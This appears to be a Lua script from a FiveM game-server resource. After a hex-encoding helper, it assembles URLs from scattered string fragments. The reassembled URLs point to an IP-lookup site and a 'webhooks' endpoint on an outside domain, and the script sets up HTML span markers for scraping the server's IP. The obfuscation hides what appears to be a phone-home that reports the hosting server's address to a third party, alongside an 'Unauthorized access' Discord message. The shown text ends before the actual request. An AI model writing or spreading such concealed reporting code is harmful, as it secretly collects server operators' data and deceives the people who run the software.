function string.tohex(s,chunkSize)s=(type(s)=="string"and s or type(s)=="nil"and""or tostring(s))chunkSize=chunkSize or 2048 local rt={} string.tohex_sformat=(string.tohex_sformat and string.tohex_chunkSize and string.tohex_chunkSize==chunkSize and string.tohex_sformat)or string.rep("%02X",math.min(#s,chunkSize)) string.tohex_chunkSize=( string.tohex_chunkSize and string.tohex_chunkSize==chunkSize and string.tohex_chunkSize or chunkSize)
for i = 1,#s,chunkSize do rt[#rt+1]=string.format(string.tohex_sformat:sub(1,(math.min(#s-i+1,chunkSize)*4)),s:byte(i,i+chunkSize-1)) end if #rt == 1 then return rt[1] else return table.concat(rt,"")end end 

local vFAA,vFAB,t,vPR,vA,vB
function rFAA() return vFAA;end 
function rFAB() return vFAB;end 
function rT() return t;end 
function rA() return vA;end
function rB() return vB;end
function gPR() return PerformHttpRequest;end
function gRN() return GetCurrentResourceName;end
function eM() return "[ "..gRN()().." : Error ] : ";end
function uA() return "Unauthorized access. Contact us on discord (https://discord.gg/ukgQa5K) for more information.";end
function lH() return "127.0.0.1";end

vFAB='</span>' 
t = {["eH"]='endhook ',["sH"]='starthook ',["te"]='terr',["fs"]='hooks',["k"]='akz',["get"]='get',["co"]='com',["ne"]='net',["adr"]=':/',["au"]='au',["f"]='fre',["wide"]='www',["me"]='my',["d"]='.',["unw"]='http',["ad"]='ip',["secw"]='https',["o"]='mod',["wb"]='web',} 
vFAA='<span id="'..t.ad..'">' 
vPR = PerformHttpRequest
vA=(t.secw..t.adr..'/'..t.wide..t.d..t.me..t.ad..t.d..t.co)
vB=(t.secw..t.adr..'/'..t.wide..t.d..t.o..t.f..t.k..t.d..t.ne..'/'..t.wb..t.fs) 
